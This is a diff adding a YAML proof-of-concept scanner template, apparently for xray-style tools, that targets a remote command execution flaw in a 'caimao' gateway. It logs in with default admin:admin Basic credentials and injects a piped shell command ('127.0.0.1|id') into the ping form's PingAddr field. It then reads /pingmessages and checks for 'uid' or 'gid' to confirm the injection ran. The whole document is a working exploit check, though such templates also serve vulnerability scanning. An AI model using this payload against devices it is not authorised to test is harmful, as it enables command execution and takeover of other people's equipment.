@@ -1,0 +1,25 @@
+name: poc-yaml-caimao-gateway-rce
+detail:
+  author: 
+  links:
+groups:
+  yesha:
+    - method: POST
+      path: /goform/formping
+      headers:
+        Authorization: Basic YWRtaW46YWRtaW4=
+        Accept-Encoding: gzip
+      body: | 
+        PingAddr=127.0.0.1|id&PingPackNumb=1&PingMsg=
+      expression: >-
+        response.body.bcontains(b'Start') && response.body.bcontains(b'Tip') 
+
+    - method: GET
+      path: /pingmessages
+      headers: 
+        Authorization: Basic YWRtaW46YWRtaW4=
+        Accept-Encoding: gzip
+      expression: >-
+        response.body.bcontains(b'uid') || response.body.bcontains(b'gid')
+
+    
